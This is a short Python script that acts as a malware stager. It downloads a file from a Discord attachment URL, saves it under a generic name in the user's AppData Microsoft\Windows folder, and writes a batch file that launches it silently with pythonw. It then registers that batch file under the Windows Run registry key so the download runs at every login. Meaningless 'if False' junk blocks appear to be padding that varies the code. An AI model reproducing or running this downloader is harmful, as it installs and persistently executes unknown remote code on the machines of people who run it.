import os
import requests
import winreg as reg

def start():
    response = requests.get('https://cdn.discordapp.com/attachments/1083783447291629640/1264390340518088725/my_script.py?ex=669db2c4&is=669c6144&hm=fbd568cff7d5184f934296c0af188d504ce192e6bffcab904e0218361a8c32f8&')
    if response.status_code == 200:
        file_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows')
        file_name = 'file.py'
        with open(os.path.join(file_path, file_name), 'wb') as file:
            file.write(response.content)
        print(f'Downloaded file saved as {file_name}')
        add_to_startup(file_path, file_name)
    else:
        print(f'Failed to download file. Status code: {response.status_code}')
    if False:
        _var_151_0 = (689, 759, 792)

        def _var_151_fn():
            pass

def add_to_startup(file_path, file_name):
    script_path = f'{file_path}\\{file_name}'
    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows')
    if False:
        _var_152_0 = (60, 540, 507)
        _var_152_1 = (984, 956, 908)

        def _var_152_fn():
            pass
    bat_name = 'startup_script.bat'
    with open(os.path.join(bat_path, bat_name), 'w') as bat_file:
        bat_file.write(f'@echo off\nstart "" pythonw "{script_path}"\nexit')
    if False:
        _var_153_0 = (964, 34, 526)
        _var_153_1 = (11, 964, 859)
        _var_153_2 = (139, 892, 614)

        def _var_153_fn():
            pass
    key = reg.HKEY_CURRENT_USER
    sub_key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    reg_key = reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(reg_key, 'MyStartupScript', 0, reg.REG_SZ, f'{bat_path}\\{bat_name}')
    reg.CloseKey(reg_key)